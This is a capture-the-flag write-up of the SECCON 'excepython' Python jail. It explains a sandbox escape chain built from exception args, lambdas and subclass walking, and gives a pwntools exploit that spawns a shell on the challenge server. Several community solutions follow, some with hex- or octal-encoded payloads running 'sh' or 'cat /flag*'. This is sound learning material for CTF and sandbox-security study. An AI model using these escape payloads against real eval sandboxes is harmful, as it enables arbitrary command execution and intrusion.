# excepython

Attachment:

```python
#!/usr/local/bin/python3
ex = None
while (code := input("jail> ")) and all(code.count(c) <= 1 for c in ".,(+)"):
    try:
        eval(code, {"__builtins__": {}, "ex": ex})
    except Exception as e:
        ex = e
        print(type(ex), repr(ex.args))
```

Requirements:

1. At most one occurrence for each character `.,(+)`: use lambda + `__getattribute__` for `a.b`, call function step by step, save intermediate values in exception `KeyError` via `{}[obj]`
2. No builtins: use `[].__setattr__.__objclass__.__subclasses__()[os_wrap_close_index].__init__.__globals__["system"]("sh")`

First, we need to know how to save data into exception. There are two ways I found:

```python
# KeyError
>>> try:
...     {}[123]
... except Exception as e:
...     print(e.args)
...
(123,)
# AttributeError
>>> try:
...     object.zzz
... except Exception as e:
...     print(e.obj)
...
<class 'object'>
```

The first way has its limitations: the argument type cannot be list, otherwise the error will change and we can no longer maintain the object we want:

```python
>>> try:
...     {}[[1]]
... except Exception as e:
...     print(type(e))
...     print(e.args)
... 
<class 'TypeError'>
("unhashable type: 'list'",)
```

The second way consumes one `.`, which is not suitable for this challenge: we need an extra `.` in `ex.args` to access the object we saved, but we cannot use another one to save object to `ex`. So we have to use the first way to save object.

Next, the problem is, how to access attributes? The vanilla `a.b` consumes one `.`, which is not feasible. We used the method from [jailCTF 2025 one](../misc/pyjail/jailctf-2025-one.md):

```python
lambda x,*y: x.__getattribute__(*y))
```

However, it consumes `,`. We change it to:

```python
lambda x: x[0].__getattribute__(*x[1:])
```

Next, we can follow the similar process of [jailCTF 2025 one](../misc/pyjail/jailctf-2025-one.md) to get `class object`:

```python
try:
    {}[g := lambda x: x[0].__getattribute__(*x[1:])]
except Exception as e:
    print(type(e))
    print(repr(e.args))

    try:
        # [].__setattr__
        {}[g := e.args[0], g([[]] + ["__setattr__"])]
    except Exception as e:
        print(type(e))
        print(repr(e.args))

        try:
            # [].__setattr__.__objclass__
            {}[g := e.args[0], g[0]([g[1]] + ["__objclass__"])]
        except Exception as e:
            print(type(e))
            print(repr(e.args))
```

At this point, we need to pass three arguments (`[object, object, "__subclasses__"]` corresponding to `object.__getattribute__(object, "__subclasses__")`) to the `__getattribute__` lambda, to access `[].__setattr__.__objclass__.__subclasses__`. However, at this time, I did not find a way to do this. So, I went for another chain to access builtins: `[].__reduce_ex__(2)[0].__builtins__["__import__"]("os").system("sh")`:

```python
try:
    {}[g := lambda x: x[0].__getattribute__(*x[1:])]
except Exception as ex:
    print(type(ex))
    print(repr(ex.args[0]))

    try:
        # [].__reduce_ex__
        {}[g := ex.args[0], g([[]] + ["__reduce_ex__"])]
    except Exception as ex:
        print(type(ex))
        print(repr(ex.args[0]))

        try:
            # [].__reduce_ex__(2)[0]
            {}[g := ex.args[0], g[1](2)[0]]
        except Exception as ex:
            print(type(ex))
            print(repr(ex.args[0]))

            try:
                # [].__reduce_ex__(2)[0].__builtins__["__import__"]
                {}[g := ex.args[0], g[0][0]([g[1]] + ["__builtins__"])["__import__"]]
            except Exception as ex:
                print(type(ex))
                print(repr(ex.args[0]))

                try:
                    # [].__reduce_ex__(2)[0].__builtins__["__import__"]("os")
                    {}[g := ex.args[0], g[1]("os")]
                except Exception as ex:
                    print(type(ex))
                    print(repr(ex.args[0]))

                    try:
                        # [].__reduce_ex__(2)[0].__builtins__["__import__"]("os").system
                        {}[g := ex.args[0], g[0][0][0][0]([g[1]] + ["system"])]
                    except Exception as ex:
                        print(type(ex))
                        print(repr(ex.args[0]))

                        try:
                            # [].__reduce_ex__(2)[0].__builtins__["__import__"]("os").system("sh")
                            {}[g := ex.args[0], g[1]("sh")]
                        except Exception as ex:
                            print(type(ex))
                            print(repr(ex.args[0]))
```

However, when I port the attack to the jail environment, it always fails with missing `__import__` when running `__reduce_ex__`. Weird. So I had to return to the chain of `[].__setattr__.__objclass__.__subclasses__()[os_wrap_close_index].__init__.__globals__["system"]("sh")`, which required calling `a.__getattribute__(a, c)`: I used another lambda `g := lambda x: f([x[0]]+x)` where `f := lambda x: x[0].__getattribute__(*x[1:])` to achieve this:

```python
ex = None
try:
    {}[f := lambda x: x[0].__getattribute__(*x[1:])]
except Exception as e:
    ex = e
    print(type(e))
    print(repr(e.args[0]))

try:
    {}[f := ex.args[0], g := lambda x: f([x[0]]+x)]
except Exception as e:
    ex = e
    print(type(e))
    print(repr(e.args[0]))

try:
    # [].__setattr__
    {}[g := ex.args, g[0][0]([[]] + ["__setattr__"])]
except Exception as e:
    ex = e
    print(type(e))
    print(repr(e.args[0]))

try:
    # [].__setattr__.__objclass__
    {}[g := ex.args[0], g[0][0][0]([g[1]] + ["__objclass__"])]
except Exception as e:
    ex = e
    print(type(e))
    print(repr(e.args[0]))

try:
    # [].__setattr__.__objclass__.__subclasses__
    {}[g := ex.args[0], g[0][0][0][1]([g[1]] + ["__subclasses__"])]
except Exception as e:
    ex = e
    print(type(e))
    print(repr(e.args[0]))

try:
    # index of os._wrap_close can be found via: print(str(object.__subclasses__()).split(', ').index("<class 'os._wrap_close'>"))
    # [].__setattr__.__objclass__.__subclasses__()[166]
    {}[g := ex.args[0], g[1]()[166]]
except Exception as e:
    ex = e
    print(type(e))
    print(repr(e.args[0]))

try:
    # [].__setattr__.__objclass__.__subclasses__()[166].__init__
    {}[g := ex.args[0], g[0][0][0][0][0][1]([g[1]] + ["__init__"])]
except Exception as e:
    ex = e
    print(type(e))
    print(repr(e.args[0]))

try:
    # [].__setattr__.__objclass__.__subclasses__()[166].__init__.__globals__["system"]
    {}[g := ex.args[0], g[0][0][0][0][0][0][0]([g[1]] + ["__globals__"])["system"]]
except Exception as e:
    ex = e
    print(type(e))
    print(repr(e.args[0]))

try:
    # [].__setattr__.__objclass__.__subclasses__()[166].__init__.__globals__["system"]("sh")
    {}[g := ex.args[0], g[1]("sh")]
except Exception as e:
    ex = e
    print(type(e))
    print(repr(e.args[0]))
```

Now, change the os_wrap_close_index from 166 to 167 (find via `print(str(object.__subclasses__()).split(', ').index("<class 'os._wrap_close'>"))` in Python 3.14 in Docker) to match remote, and run the attack script to get shell:

```python
from pwn import *

context(log_level="DEBUG")

io = remote("excepython.seccon.games", 5000)

# attack chain:
# [].__setattr__.__objclass__.__subclasses__()[167].__init__.__globals__["system"]("sh")
io.recvuntil(b"jail>")
io.sendline(b"{}[f := lambda x: x[0].__getattribute__(*x[1:])]")
io.recvuntil(b"jail>")
io.sendline(b"{}[f := ex.args[0], g := lambda x: f([x[0]]+x)]")
io.recvuntil(b"jail>")
io.sendline(b'{}[g := ex.args, g[0][0]([[]] + ["__setattr__"])]')
io.recvuntil(b"jail>")
io.sendline(b'{}[g := ex.args[0], g[0][0][0]([g[1]] + ["__objclass__"])]')
io.recvuntil(b"jail>")
io.sendline(b'{}[g := ex.args[0], g[0][0][0][1]([g[1]] + ["__subclasses__"])]')
io.recvuntil(b"jail>")
io.sendline(b"{}[g := ex.args[0], g[1]()[167]]")
io.recvuntil(b"jail>")
io.sendline(b'{}[g := ex.args[0], g[0][0][0][0][0][1]([g[1]] + ["__init__"])]')
io.recvuntil(b"jail>")
io.sendline(
    b'{}[g := ex.args[0], g[0][0][0][0][0][0][0]([g[1]] + ["__globals__"])["system"]]'
)
io.recvuntil(b"jail>")
io.sendline(b'{}[g := ex.args[0], g[1]("sh")]')

# cat /flag*
# SECCON{Pyth0n_was_m4de_for_jail_cha1lenges}
io.interactive()
```

Solutions on Discord:

Idea: use `\x2e` + `format` to bypass the limitation, use `AttributeError` to save object to `ex`.

@HexF:

Chain: `ex.__traceback__.tb_frame.f_globals["__builtins__"].exec('ex.__traceback__.tb_frame.f_globals["__builtins__"].__import__("os").system("cat /flag*")')`

```python
x
'{0\x2e__traceback__\x2etb_frame\x2ef_globals[__builtins__]\x2eexec\x2ea}'.format(ex)
ex.obj('\x65\x78\x2e\x5f\x5f\x74\x72\x61\x63\x65\x62\x61\x63\x6b\x5f\x5f\x2e\x74\x62\x5f\x66\x72\x61\x6d\x65\x2e\x66\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5b\x22\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x22\x5d\x2e\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x22\x6f\x73\x22\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x22\x63\x61\x74\x20\x2f\x66\x6c\x61\x67\x2a\x22\x29')
```

@Peter:

Chain: `ex.__traceback__.tb_frame.f_builtins["__import__"]("os").system("cat /flag-*")`

```python
1/0
'{0\x2e__traceback__\x2etb_frame\x2ef_builtins\x2e__nosuch__}'.format(ex)
'{0\x2eobj[__import__]\x2e__nosuch__}'.format(ex)
{}[ex.obj('os')]
'{0\x2eargs[0]\x2esystem\x2e__nosuch__}'.format(ex)
ex.obj('cat /flag-*')
```

@nikost:

Chain: `ex.__class__.__mro__[4].__subclasses__()[os_wrap_index].__init__.__builtins__["__import__"]("os").system("/bin/bash")`

```python
1/0
"{0\x2e__class__\x2e__mro__[4]\x2e__subclasses__\x2epouet}".format(ex)
[[ex := ex.obj()[167]] for i in '12']
"{0\x2eobj\x2e__init__\x2e__builtins__[__import__]\x2epouet}".format(ex)
[[ex := ex.obj('os') for i in '12']]
"{0\x2eobj\x2esystem\x2epouet}".format(ex)
ex.obj('/bin/bash')
cat ../flag*
```

@D1N0:

Reuse `.__getattribute__` using list comprehension, chain: `ex.__traceback__.tb_frame.f_builtins["eval"]("ex.__traceback__.tb_frame.f_builtins['__import__']('os').system('cat /flag*')")`

```python
1/0
[[[ex:=[ex["eval"] if idx=="d" else ex.__getattribute__][0](x)][0] for x in ["__traceback__" if idx == "a" else "tb_frame" if idx=="b" else "f_builtins" if idx=="c" else "ex['__import__']\x28'os'\x29\x2esystem\x28'cat /flag*'\x29"]][0] for idx in "abcd"]
```

A similar solution to mime by @huongnoi100%:

Chain: `ex.__traceback__.tb_frame.f_globals["__builtins__"].__import__("os").system("cat /flag-*")`

```python
jail> {}[lambda d:[*d][0].__getattribute__(d[[*d][0]]),0]
{}[ex.args[0][0],ex]
{}[[s:=ex.args[0]] and s[0],s[0]({s[1]:'__traceback__'})]
{}[[s:=ex.args[0]] and s[0],s[0]({s[1]:'tb_frame'})]
{}[[s:=ex.args[0]] and s[0],s[0]({s[1]:'f_globals'})['__builtins__']]
{}[[s:=ex.args[0]] and s[0],s[0]({s[1]:'__import__'})]
{}[[s:=ex.args[0]] and s[0],s[1]('os')]
{}[[s:=ex.args[0]] and s[0],s[0]({s[1]:'system'})]
{}[[s:=ex.args[0]] and s[0],s[1]('cat /flag-*')]
jail> jail> jail> jail> jail> jail> jail> jail> SECCON{Pyth0n_was_m4de_for_jail_cha1lenges}
```

@golden:

Save the previous `ex` into `ex.args` and recover it:

Chain: `''.__class__.__base__.__subclasses__()[os_wrap_index].__init__.__globals__["sys"].modules["os"].system("sh")`

```python
{}[lambda f: ''.__class__,ex]
{}[[x:=ex.args[0],x][0][0](x[1])]
{}[lambda f: f.__base__,ex]
{}[*[x:=lambda f:f.args][0](ex)[0],x]
{}[*[f:=ex.args[0]][0][:1],f[2](f[1])[0]]
{}[[x:=ex.args[0],x][0][0](x[1])]
{}[lambda f: f.__subclasses__(),ex]
{}[*[x:=lambda f:f.args][0](ex)[0],x]
{}[*[f:=ex.args[0]][0][:1],[f[2](f[1])[0]][0]]
{}[*[x:=ex.args[0],x][0][0](x[1])] # edited to unpack subclasses
{}[lambda f: [c for c in f if 'wrap_close' in ''.__class__(c)][0],ex]
{}[*[x:=lambda f:f.args][0](ex)[0],x]
{}[*[f:=ex.args[0]][0][:1],[f[2](f[1])[0]][0]]
{}[[x:=ex.args[0],x][0][0](x[1])]
{}[lambda f: f.__init__,ex]
{}[*[x:=lambda f:f.args][0](ex)[0],x]
{}[*[f:=ex.args[0]][0][:1],f[2](f[1])[0]]
{}[[x:=ex.args[0],x][0][0](x[1])]
{}[lambda f: f.__globals__['sys'],ex]
{}[*[x:=lambda f:f.args][0](ex)[0],x]
{}[*[f:=ex.args[0]][0][:1],f[2](f[1])[0]]
{}[[x:=ex.args[0],x][0][0](x[1])]
{}[lambda f: f.modules['os'],ex]
{}[*[x:=lambda f:f.args][0](ex)[0],x]
{}[*[f:=ex.args[0]][0][:1],f[2](f[1])[0]]
{}[[x:=ex.args[0],x][0][0](x[1])]
{}[lambda f: f.system('sh'),ex]
{}[*[x:=lambda f:f.args][0](ex)[0],x]
{}[*[f:=ex.args[0]][0][:1],f[2](f[1])[0]]
{}[[x:=ex.args[0],x][0][0](x[1])]
```

@oh_word:

```python
enc_str = lambda s: '"%s"' % "".join(f"\\x{ord(c):02X}" for c in s)

slp(f'{enc_str("{.__class__.__base__.__subclasses__.x}")}.format(0)')
slp(f"[0 for ex.__typing_subst__ in [lambda a,k={{}}: [k['r'] for k['r'] in [[a[0] if 'r' not in k else k['r']][0](*a[1:])]][0]]]")
slp("[sb:=ex.obj()]and sb[0][ex][[sb[-1]]]")
slp("[sb:=ex.obj()]and sb[0][ex][[-1]]")
sla(b"help> ", b"subprocess")
sla(b"help> ", b"q")

slp(f"[0 for ex.__typing_subst__ in [lambda a,k={{}}: [k['r'] for k['r'] in [[a[0] if 'r' not in k else k['r']][0](*a[1:])]][0]]]")
slp("[sb:=ex.obj()]and sb[0][ex][[sb[306], ['/usr/bin/cat']+['/flag-d108ec7a911b72568e8aa0855f1787d8\\x2etxt']]]")

p.interactive()
```

@uNickz:

```python
#!/usr/bin/env python3

from pwn import *

if args.DEBUG:
    context.log_level = "DEBUG"

host, port = "excepython.seccon.games", 5000

rr  = lambda *x, **y: io.recvrepeat(*x, **y)
ru  = lambda *x, **y: io.recvuntil(*x, **y)
rl  = lambda *x, **y: io.recvline(*x, **y)
rc  = lambda *x, **y: io.recv(*x, **y)
sla = lambda *x, **y: io.sendlineafter(*x, **y)
sa  = lambda *x, **y: io.sendafter(*x, **y)
sl  = lambda *x, **y: io.sendline(*x, **y)
sn  = lambda *x, **y: io.send(*x, **y)

# -- Exploit goes here --

io = remote(host, port)

payloads = """
    1/0

    # args[0] = lambda function
    # args[1] = exception instance
    # args[2] = attribute name to get from exception instance

    # (lambda, ZeroDivisionError('division by zero'))
    {}[ lambda *args: [args[0]] + [args[1].__getattribute__( *args[2:][-2:] )], ex ]

    # (lambda .__class__, <class 'ZeroDivisionError'>)
    {}[ *[a:=ex.args[0], a[0]( *[*a]+["__class__"] )][1] ]

    # (lambda .__class__, <class 'type'>)
    {}[ *[a:=ex.args[0], a[0]( *[*a]*2+["__class__"] )][1] ]

    # (lambda .__base__, <class 'object'>)
    {}[ *[a:=ex.args[0], a[0]( *[*a]*2+["__base__"] )][1] ]

    # (lambda .__subclasses__, <built-in method __subclasses__>)
    {}[ *[a:=ex.args[0], a[0]( *[*a]*2+["__subclasses__"] )][1] ]

    # (lambda .__subclasses__(), <class 'os._wrap_close'>)
    {}[ *[ a:=ex.args[0], [a[0]]+[a[1]()[167]] ][1] ]

    # (lambda, <function _wrap_close.__init__>)
    {}[ *[a:=ex.args[0], a[0]( *[*a]*2+["__init__"] )][1] ]

    # (<built-in function system>, )
    {}[ [a:=ex.args[0], a[0]( *[*a]+["__globals__"] )[1]["system"] ][1] ]

    ex.args[0]("sh")
"""

for payload in payloads.strip().splitlines():
    payload = payload.strip()
    if payload.startswith("#"): continue
    payload = payload.split("#", 1)[0].strip()
    if not payload: continue
    sla(b"jail> ", payload.strip().encode())

io.interactive() # SECCON{Pyth0n_was_m4de_for_jail_cha1lenges}
io.close()
```

@Muhammed.:

```python
# ex.__traceback__.tb_frame.f_builtins['eval']
# ex.__traceback__.tb_frame.f_builtins['eval']('().__class__.__class__.__subclasses__([].__class__.__class__)[0].register.__builtins__["__import__"]("os").system("sh")')
[
    [
    [[o:=ex] if i == "0" else 0] and
    [[s:="__traceback__"] if i == "0" else 0] and
    [[s:="tb_frame"] if i == "1" else 0] and
    [[s:="f_builtins"] if i == "2" else 0] and
    [[s:="\50\51\56\137\137\143\154\141\163\163\137\137\56\137\137\143\154\141\163\163\137\137\56\137\137\163\165\142\143\154\141\163\163\145\163\137\137\50\133\135\56\137\137\143\154\141\163\163\137\137\56\137\137\143\154\141\163\163\137\137\51\133\60\135\56\162\145\147\151\163\164\145\162\56\137\137\142\165\151\154\164\151\156\163\137\137\133\42\137\137\151\155\160\157\162\164\137\137\42\135\50\42\157\163\42\51\56\163\171\163\164\145\155\50\42\163\150\42\51"] if i == "3" else 0] and
    [[tt:=o.__getattribute__] if i == "0" or i == "1" or i == "2" else 0] and
    [[tt:=o['eval']] if i == "3" else 0] and
    [[o:=tt(s)] if True else 0]
    ] for i in "0123"
]

jail> muhammed
jail> [ [ [[o:=ex] if i == "0" else 0] and [[s:="__traceback__"] if i == "0" else 0] and [[s:="tb_frame"] if i == "1" else 0] and [[s:="f_builtins"] if i == "2" else 0] and [[s:="\50\51\56\137\137\143\154\141\163\163\137\137\56\137\137\143\154\141\163\163\137\137\56\137\137\163\165\142\143\154\141\163\163\145\163\137\137\50\133\135\56\137\137\143\154\141\163\163\137\137\56\137\137\143\154\141\163\163\137\137\51\133\60\135\56\162\145\147\151\163\164\145\162\56\137\137\142\165\151\154\164\151\156\163\137\137\133\42\137\137\151\155\160\157\162\164\137\137\42\135\50\42\157\163\42\51\56\163\171\163\164\145\155\50\42\163\150\42\51"] if i == "3" else 0] and [[tt:=o.__getattribute__] if i == "0" or i == "1" or i == "2" else 0] and [[tt:=o['eval']] if i == "3" else 0] and [[o:=tt(s)] if True else 0] ] for i in "0123" ]
```
